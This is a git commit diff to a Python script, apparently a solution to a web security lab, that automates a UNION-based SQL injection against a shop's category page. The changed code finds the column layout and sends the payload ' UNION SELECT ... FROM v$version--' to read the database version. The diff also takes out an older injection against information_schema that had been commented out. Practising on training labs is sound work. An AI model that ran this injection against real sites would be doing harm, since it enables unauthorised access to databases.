3e97e31a9385baa616532fd2622f1605cd53c599
madi <madimirzakup@gmail.com>
2025-01-14 22:06:34 +0500

    xd

--- Server Side Topics/SQLi/SQL injection attack, querying the database type and version on MySQL and Microsoft/payload.py
+++ Server Side Topics/SQLi/SQL injection attack, querying the database type and version on MySQL and Microsoft/payload.py
@@ -1,43 +1,43 @@
 import sys
 import logging
 import urllib3
-
 import requests
-
-
+import re
 import utils
 from shop import Shop
-log = logging.getLogger(__name__) 
+
+log = logging.getLogger(__name__)
 logging.basicConfig(
-    stream=sys.stdout, 
+    stream=sys.stdout,
     level=logging.INFO,
-    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
-    style="{",
+    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
+    style="{", 
     datefmt="%H:%M:%S",
 )
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def main(args):
     shop = Shop(args.url, args.no_proxy)
-    num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy)
+    num_columns = utils.determine_number_of_columns(
+        shop.category_url, shop.no_proxy, oracle=True
+        )
     if not num_columns:
         log.error("Couldn't determine number of columns. Exiting")
         sys.exit(-1)
     text_columns = utils.determine_text_columns(
-        shop.category_url, shop.no_proxy, num_columns
-        )
-    print(num_columns, text_columns)
-    #nulls = ["NULL"] * num_columns
-    #nulls[text_columns[0]] = "'a'"
-    #nulls = ",".join(nulls)
-    #resp = shop.get_category(
-    #    f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
-    #)
-    #print(resp.txt)
-        
-
-
-
+        shop.category_url, shop.no_proxy, num_columns, oracle=True
+    )
+    nulls = ["NULL"] * num_columns
+    nulls[text_columns[0]] = "banner"
+    nulls_str = ",".join(nulls)
+    exploit = f"' UNION SELECT {nulls_str} FROM v$version--"
+    shop.get_category(exploit)
+    shop.is_solved()
+    
+    
 if __name__ == "__main__":
-    args = utils.parse_args(sys.argv)
+    args=utils.parse_args(sys.argv)
     main(args)
